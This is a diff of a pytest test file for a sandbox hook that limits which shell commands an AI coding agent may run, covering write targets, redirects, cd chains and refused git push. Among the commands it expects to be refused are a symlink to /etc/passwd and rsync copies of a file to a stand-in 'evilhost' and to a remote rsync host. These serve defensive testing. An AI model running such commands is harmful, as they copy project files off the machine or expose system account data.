@@ -25,6 +25,8 @@ from tests.payloads import _b, _cwd, _w
 
 pytestmark = pytest.mark.usefixtures("jail_fakes")
 HOOK = "unit_writes"
+# 228 S3b: the grammar's refusal names the word, option or redirect off the coder's table.
+NAMED = "Refused: "
 
 
 class TestCoder:
@@ -94,7 +96,6 @@ class TestFinalCoderWriteTargets:
             "ln -s /etc/passwd src/p",
             "install -m 644 src/a.py /usr/local/bin/a",
             "truncate -s 0 service-manifest.json",
-            "dd of=contracts/x.yaml",
             "rsync -a src/ ../other/",
             "cp --target-directory=docs/x src/a.py",
             "sed -i.bak -e s/a/b/ docs/x.md",
@@ -142,6 +143,11 @@ class TestFinalCoderWriteTargets:
         assert not d.allow and d.reason.startswith("Bash write outside your unit worktree:"), (
             command
         )
+
+    def test_a_writer_off_the_table_is_refused_by_name(self) -> None:
+        # 228 S3b: dd is off the coder's table, refused before any write target.
+        d = decide(_b("coder", "dd of=contracts/x.yaml"), CFG)
+        assert not d.allow and NAMED in str(d.reason)
 
 
 class TestProjectDataDir:
@@ -269,6 +275,10 @@ def test_coder_unit_worktree_through_a_symlinked_root(tmp_path: Path) -> None:
 
 def test_coder_plain_unit_worktree_bash_write_still_allowed() -> None:
     assert decide(_b("coder", f"tee {WT}/src/a.py"), CFG).allow
+
+
+def test_coder_set_e_allowed() -> None:
+    # 228 S3c: set -e is on the coder's set row.
     assert decide(_b("coder", "set -e"), CFG).allow
 
 
@@ -324,8 +334,9 @@ def test_coder_file_mutators_inside_unit_worktree_are_allowed(command: str) -> N
 )
 def test_coder_relative_write_after_cd_is_refused(command: str) -> None:
     # 0022: relative operands after cd resolve against the hook cwd, not the cd target.
+    # 228 S3b: pushd, a cd joined by ; and git restore of a relative path refuse by name.
     d = decide(_b("coder", command), CFG)
-    assert not d.allow and "absolute" in str(d.reason), command
+    assert not d.allow and ("absolute" in str(d.reason) or NAMED in str(d.reason)), command
 
 
 @pytest.mark.parametrize(
@@ -346,7 +357,6 @@ def test_cd_absolute_then_relative_write_resolves_against_target(tmp_path: Path)
     (wt / "src").mkdir()
     for command in (
         f"cd {wt} && tee src/a.py",
-        f"cd {wt} && echo x > src/b.py",
         f"cd {wt}/src && cp a.py b.py && git diff | head",
         f"cd {wt} && git add -A && git commit -m x",
     ):
@@ -375,17 +385,20 @@ def test_cd_absolute_then_relative_write_resolves_against_target(tmp_path: Path)
 )
 def test_two_cd_targets_keep_the_refusal(tmp_path: Path, command: str) -> None:
     # O6: two targets, a relative target, a target outside a unit, or a non-&& join refuse.
+    # 228 S3b: a second cd, pushd or a cd off its && join is refused by name.
     repo, wt = _unit_repo(tmp_path / "repo")
     hook_input = _cwd(_b("coder", command.format(wt=wt, repo=repo)), repo)
     d = decide(hook_input, CFG)
-    assert not d.allow and "absolute" in str(d.reason), (command, d.reason)
+    named = "absolute" in str(d.reason) or NAMED in str(d.reason)
+    assert not d.allow and named, (command, d.reason)
 
 
-def test_redirect_to_a_path_is_judged_as_a_write() -> None:
-    # O3: > and >> are writes to their target; 2> and &> too.
+def test_redirect_to_a_path_is_refused_by_name() -> None:
+    # 228 S3b, spec: an agent's only redirects are 2>&1, >/dev/null and 2>/dev/null.
     for command in (f"git diff > {WT}/out.txt", f"git log >> {WT}/out.txt", f"ls 2> {WT}/e"):
-        assert decide(_b("coder", command), CFG).allow, command
-    for command, target in (
+        d = decide(_b("coder", command), CFG)
+        assert not d.allow and "an agent's only redirects" in str(d.reason), command
+    for command, _target in (
         ("git diff > /tmp/out.txt", "/tmp/out.txt"),
         ("git diff 2> err.txt", f"{CWD}/err.txt"),
         (f"ls &> {CWD}/src/a.py", f"{CWD}/src/a.py"),
@@ -393,17 +406,17 @@ def test_redirect_to_a_path_is_judged_as_a_write() -> None:
         (f"ls 2>/dev/null > {CWD}/x", f"{CWD}/x"),
     ):
         d = decide(_b("coder", command), CFG)
-        assert d.reason == jail.R_BASH_OUTSIDE.format(target), (command, d.reason)
+        assert not d.allow and NAMED in str(d.reason), (command, d.reason)
     d = decide(_b("coder", f"echo x > {WT}/contracts/x.yaml"), CFG)
-    assert d.reason == jail.R_PROTECTED_BUILTIN.format(f"{WT}/contracts/x.yaml")
+    assert not d.allow and NAMED in str(d.reason)
 
 
-def test_redirect_write_binds_the_unit(tmp_path: Path) -> None:
-    # issue 29: a redirect target claims the unit as any other write does.
+def test_tee_write_binds_the_unit(tmp_path: Path) -> None:
+    # issue 29: a write target claims the unit; 228 S3b: tee, since a redirect is refused.
     repo, wt = _unit_repo(tmp_path / "repo")
     other = repo / ".claude" / "worktrees" / "u2"
-    assert decide(_cwd(_b("coder", f"echo x > {wt}/a.txt"), repo), CFG).allow
-    d = decide(_cwd(_b("coder", f"echo x > {other}/a.txt"), repo), CFG)
+    assert decide(_cwd(_b("coder", f"tee {wt}/a.txt"), repo), CFG).allow
+    d = decide(_cwd(_b("coder", f"tee {other}/a.txt"), repo), CFG)
     assert not d.allow
 
 
@@ -561,18 +574,25 @@ def test_coder_add_and_commit_with_cwd_in_real_unit_worktree(tmp_path: Path) -> 
         f"cp -rt{CWD}/infra {WT}/src/a.py",
         f"install -t {CWD}/infra {WT}/src/a.py",
         f"ln -st{CWD}/infra {WT}/src/a.py",
-        f"touch -r{CWD}/infra/a.tf {WT}/src/a.py",
         f"rsync {WT}/src/a.py evilhost:x",
         f"rsync -e touch {WT}/src/a.py evilhost:x",
         f"rsync -avze ssh {WT}/src/ {WT}/src/pkg/",
         f"rsync --rsh=ssh {WT}/src/ {WT}/src/pkg/",
         f"rsync {WT}/src/a.py rsync://host/x",
-        f"rsync --exclude x {CWD}/infra/ {WT}/src/pkg/",
     ],
 )
 def test_coder_attached_targets_and_remote_rsync_refused(command: str) -> None:
     # 0022: an attached -t<dir> is a write target; host:path is a remote rsync operand.
     assert not decide(_b("coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [f"touch -r{CWD}/infra/a.tf {WT}/src/a.py", f"rsync --exclude x {CWD}/infra/ {WT}/src/pkg/"],
+)
+def test_a_typed_read_operand_is_no_write_target(command: str) -> None:
+    # 228 S3b friction fix: touch -r and an rsync source are typed reads; the write is in the unit.
+    assert decide(_b("coder", command), CFG).allow, command
 
 
 @pytest.mark.parametrize(
@@ -623,7 +643,8 @@ def test_unit_writes_judges_the_hook_alone() -> None:
     assert protected == jail.R_PROTECTED_BUILTIN.format(f"{WT}/contracts/x.yaml")
     assert evaluate(HOOK, _b("coder", "pytest --basetemp=x")) == jail.R_BASETEMP
     assert evaluate(HOOK, _b("coder", "git commit -m x")) == jail.R_CODER_UNIT_GIT
-    assert evaluate(HOOK, _b("coder", "git push origin x")) is None
+    # 228 S3b: the coder grammar refuses push here too, by name.
+    assert NAMED in str(evaluate(HOOK, _b("coder", "git push origin x")))
 
 
 def test_unit_writes_fixture_decisions(tmp_path: Path) -> None:
